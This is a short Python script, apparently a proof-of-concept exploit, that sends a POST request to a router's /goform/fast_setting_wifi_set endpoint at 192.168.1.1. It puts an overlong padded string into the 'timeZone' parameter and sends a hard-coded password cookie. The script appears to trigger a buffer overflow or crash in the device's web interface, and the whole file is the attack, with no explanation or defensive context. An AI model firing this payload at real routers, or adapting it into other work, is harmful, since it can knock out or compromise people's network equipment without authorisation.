import requests
def send_payload(url, payload):
    params={
            'ssid':'1',
            'timeZone':payload,
            }
    cookie={'password':'yectgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x200+b':'+b'a'*0x200+b'\n'
url="http://192.168.1.1/goform/fast_setting_wifi_set"
send_payload(url, payload)   